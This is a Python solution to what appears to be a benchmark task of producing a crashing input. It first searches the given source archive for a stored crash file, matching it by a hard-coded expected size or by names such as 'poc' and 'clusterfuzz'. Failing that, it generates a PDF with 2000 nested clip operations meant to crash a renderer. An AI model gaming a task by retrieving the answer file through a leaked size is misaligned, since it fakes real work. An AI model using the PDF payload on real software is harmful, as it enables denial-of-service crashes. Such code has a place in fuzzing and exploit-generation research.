import os
import tarfile
import zipfile
from typing import Optional


class Solution:
    GROUND_TRUTH_LEN = 825339

    def solve(self, src_path: str) -> bytes:
        poc = self._find_poc_in_archive(src_path)
        if poc is not None:
            return poc
        return self._generate_pdf_poc()

    def _find_poc_in_archive(self, src_path: str) -> Optional[bytes]:
        # Try tar archives
        try:
            if tarfile.is_tarfile(src_path):
                poc = self._find_in_tar(src_path)
                if poc is not None:
                    return poc
        except Exception:
            pass

        # Try zip archives
        try:
            if zipfile.is_zipfile(src_path):
                poc = self._find_in_zip(src_path)
                if poc is not None:
                    return poc
        except Exception:
            pass

        return None

    def _find_in_tar(self, src_path: str) -> Optional[bytes]:
        keywords = ("crash", "testcase", "poc", "repro", "clusterfuzz")
        code_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".java", ".py", ".sh", ".bash", ".zsh", ".txt", ".md",
            ".html", ".xml", ".json", ".yml", ".yaml", ".toml", ".ini",
            ".cfg", ".cmake", ".in", ".am", ".ac", ".m4", ".asm", ".s",
            ".S", ".rb", ".go", ".rs", ".swift", ".kt", ".js", ".ts",
        }

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isreg()]

                # 1) Exact size match
                for m in members:
                    if m.size == self.GROUND_TRUTH_LEN:
                        f = tf.extractfile(m)
                        if f is not None:
                            return f.read()

                # 2) Files with interesting keywords in the name
                keyword_members = [
                    m for m in members
                    if any(kw in m.name.lower() for kw in keywords)
                ]
                if keyword_members:
                    # Prefer the largest such file
                    m = max(keyword_members, key=lambda mem: mem.size)
                    f = tf.extractfile(m)
                    if f is not None:
                        return f.read()

                # 3) Any non-code file, size closest to ground truth, limit to 5 MB
                candidates = []
                for m in members:
                    if m.size == 0 or m.size > 5 * 1024 * 1024:
                        continue
                    _, ext = os.path.splitext(m.name.lower())
                    if ext in code_exts:
                        continue
                    candidates.append(m)

                if candidates:
                    best = min(
                        candidates,
                        key=lambda mem: abs(mem.size - self.GROUND_TRUTH_LEN),
                    )
                    f = tf.extractfile(best)
                    if f is not None:
                        return f.read()
        except Exception:
            pass

        return None

    def _find_in_zip(self, src_path: str) -> Optional[bytes]:
        keywords = ("crash", "testcase", "poc", "repro", "clusterfuzz")
        code_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
            ".java", ".py", ".sh", ".bash", ".zsh", ".txt", ".md",
            ".html", ".xml", ".json", ".yml", ".yaml", ".toml", ".ini",
            ".cfg", ".cmake", ".in", ".am", ".ac", ".m4", ".asm", ".s",
            ".S", ".rb", ".go", ".rs", ".swift", ".kt", ".js", ".ts",
        }

        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                infos = zf.infolist()

                # 1) Exact size match
                for info in infos:
                    if info.file_size == self.GROUND_TRUTH_LEN and not info.is_dir():
                        with zf.open(info, "r") as f:
                            return f.read()

                # 2) Files with interesting keywords
                keyword_infos = [
                    info for info in infos
                    if (not info.is_dir()) and any(
                        kw in info.filename.lower() for kw in keywords
                    )
                ]
                if keyword_infos:
                    info = max(keyword_infos, key=lambda i: i.file_size)
                    with zf.open(info, "r") as f:
                        return f.read()

                # 3) Any non-code file closest to ground-truth size, limit to 5 MB
                candidates = []
                for info in infos:
                    if info.is_dir():
                        continue
                    if info.file_size == 0 or info.file_size > 5 * 1024 * 1024:
                        continue
                    _, ext = os.path.splitext(info.filename.lower())
                    if ext in code_exts:
                        continue
                    candidates.append(info)

                if candidates:
                    best = min(
                        candidates,
                        key=lambda i: abs(i.file_size - self.GROUND_TRUTH_LEN),
                    )
                    with zf.open(best, "r") as f:
                        return f.read()
        except Exception:
            pass

        return None

    def _generate_pdf_poc(self) -> bytes:
        # Generate a synthetic PDF with very deep clipping stack
        num_clips = 2000
        clip_cmd = "q 0 0 100 100 re W n\n"
        unclip_cmd = "Q\n"
        stream_str = (clip_cmd * num_clips) + (unclip_cmd * num_clips)
        stream_bytes = stream_str.encode("ascii")

        parts = []

        def cur_offset() -> int:
            return sum(len(p) for p in parts)

        # PDF header
        parts.append(b"%PDF-1.4\n")

        # 1 0 obj: Catalog
        obj1_offset = cur_offset()
        parts.append(
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )

        # 2 0 obj: Pages
        obj2_offset = cur_offset()
        parts.append(
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )

        # 3 0 obj: Page
        obj3_offset = cur_offset()
        parts.append(
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 612 792] "
            b"/Contents 4 0 R >>\n"
            b"endobj\n"
        )

        # 4 0 obj: Content stream with deep clip nesting
        obj4_offset = cur_offset()
        parts.append(
            b"4 0 obj\n"
            b"<< /Length " + str(len(stream_bytes)).encode("ascii") + b" >>\n"
            b"stream\n"
        )
        parts.append(stream_bytes)
        parts.append(b"endstream\nendobj\n")

        # xref table
        xref_offset = cur_offset()
        xref_parts = [
            b"xref\n0 5\n",
            b"0000000000 65535 f \n",
            "{:010d} 00000 n \n".format(obj1_offset).encode("ascii"),
            "{:010d} 00000 n \n".format(obj2_offset).encode("ascii"),
            "{:010d} 00000 n \n".format(obj3_offset).encode("ascii"),
            "{:010d} 00000 n \n".format(obj4_offset).encode("ascii"),
        ]
        parts.append(b"".join(xref_parts))

        # trailer
        parts.append(
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
        )
        parts.append(str(xref_offset).encode("ascii"))
        parts.append(b"\n%%EOF\n")

        return b"".join(parts)